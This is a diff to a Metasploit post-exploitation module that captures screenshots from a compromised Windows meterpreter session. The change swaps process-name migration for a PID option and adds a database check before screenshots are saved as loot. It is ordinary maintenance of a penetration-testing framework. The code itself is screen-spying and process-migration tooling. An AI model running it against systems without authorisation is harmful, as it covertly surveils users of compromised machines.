@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Post
           'bannedit', # post module
           'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support,log x approach, nx
           'Adrian Kubok', # better record file names
-          'DLL_Cool_J' # Specify process to migrate into
+          'DLL_Cool_J' # Specify PID to migrate into
         ],
       'Platform'       => ['win'], # @todo add support for posix meterpreter somehow?
       'SessionTypes'   => ['meterpreter']
@@ -37,8 +37,8 @@ class MetasploitModule < Msf::Post
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
         OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
-        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true]),
-        OptString.new('PROCESS', [false, 'Specify process name to migrate into', ''])
+        OptBool.new('RECORD', [true, 'Record all screenshots to disk by saving them to loot', true]),
+        OptString.new('PID', [false, 'PID to migrate into before taking the screenshots', ''])
       ])
   end
 
@@ -50,18 +50,12 @@ class MetasploitModule < Msf::Post
     datastore['RECORD']
   end
 
-  def process?
-    datastore['PROCESS']
-  end
-
-
-
   def run
     host = session.session_host
     screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"
 
-    # if no process is specified, don't migrate.
-    if datastore['PROCESS'] != ''
+    # If no PID is specified, don't migrate.
+    if datastore['PID'] != ''
       migrate
     end
 
@@ -92,11 +86,15 @@ class MetasploitModule < Msf::Post
           return false
         end
         if data
-
           if record?
-            # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
-            fn = "screenshot.%0#{leading_zeros}d.jpg" % num
-            file_locations << store_loot("screenspy.screenshot", "image/jpg", session, data, fn, "Screenshot")
+            if framework.db.active
+              # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
+              fn = "screenshot.%0#{leading_zeros}d.jpg" % num
+              file_locations << store_loot("screenspy.screenshot", "image/jpg", session, data, fn, "Screenshot")
+            else
+              print_error('RECORD flag specified however the database is not connected, so no loot can be stored!')
+              return false
+            end
           end
 
           # also write to disk temporarily so we can display in browser.
@@ -121,7 +119,7 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status("Screen Spying Complete")
-    if file_locations and not file_locations.empty?
+    if record? && file_locations and not file_locations.empty?
       print_status "run loot -t screenspy.screenshot to see file locations of your newly acquired loot"
     end
 
@@ -140,19 +138,13 @@ class MetasploitModule < Msf::Post
   end
 
   def migrate
-    pid = session.sys.process.getpid
-    session.sys.process.get_processes.each do |p|
-      if p['name'] == datastore['PROCESS'] and p['pid'] != pid
-        print_status("Migrating to #{datastore['PROCESS']} pid: #{p['pid']}")
-        begin
-          session.core.migrate(p['pid'].to_i)
-          print_good("Migration successful")
-          return p['pid']
-        rescue
-          print_bad("Migration failed")
-          return nil
-        end
-      end
+    begin
+      session.core.migrate(datastore['PID'].to_i)
+      print_good("Migration successful")
+      return datastore['PID']
+    rescue
+      fail_with(Failure::Unknown, "Migration failed! Unable to take a screenshot under the desired process!")
+      return nil
     end
   end
 end
